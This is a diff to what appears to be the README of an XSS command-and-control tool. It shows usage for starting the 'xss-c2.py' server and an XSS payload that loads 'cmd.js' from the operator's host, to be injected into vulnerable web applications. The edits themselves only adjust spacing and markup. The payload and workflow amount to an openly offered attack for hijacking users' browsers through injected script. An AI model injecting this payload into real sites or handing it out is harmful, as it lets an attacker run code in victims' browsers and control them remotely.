@@ -8,6 +8,9 @@
 <div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 1.🔧 Start the Server</strong></div>
 
 
+
+
+
 ```bash
 python3 xss-c2.py [-h] [-h HOST] [-p PORT]
 
@@ -16,14 +19,14 @@ optional arguments:
   -h HOST, --host HOST  Server IP address (default: 0.0.0.0 - all interfaces)
   -p PORT, --port PORT  Server port (default: 4545)
 ```
-<br><div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 2.🚀 Inject XSS Payload</strong></div>
+<div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 2.🚀 Inject XSS Payload</strong></div>
 
 Inject the following payload into vulnerable web applications:
  ```bash
 <script src="http://YOUR_IP:YOUR_PORT/cmd.js"></script>
 ```
 
-<br><div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 3.🌐 Access Control Panel</strong></div>
+<div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 3.🌐 Access Control Panel</strong></div>
 
 Open your browser and navigate to:
  ```bash
